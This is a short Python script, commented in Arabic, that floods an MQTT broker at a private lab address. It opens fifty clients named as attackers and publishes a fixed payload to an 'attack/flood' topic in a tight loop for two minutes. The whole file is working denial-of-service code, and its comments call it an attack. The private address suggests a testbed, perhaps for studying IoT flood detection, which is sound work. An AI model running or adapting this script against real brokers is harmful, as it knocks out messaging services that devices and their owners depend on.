import time
import paho.mqtt.client as mqtt

BROKER = "192.168.117.1"   # نفس IP المستخدم سابقاً
PORT = 1883
TOPIC = "attack/flood"
PAYLOAD = "X" * 200     # حمولة ثابتة

clients = []

for i in range(50):     # عدد كبير من clients
    c = mqtt.Client(client_id=f"attacker_{i}")
    c.connect(BROKER, PORT, 60)
    c.loop_start()
    clients.append(c)

start = time.time()
while time.time() - start < 120:   # هجوم لمدة دقيقتين
    for c in clients:
        c.publish(TOPIC, PAYLOAD, qos=0)

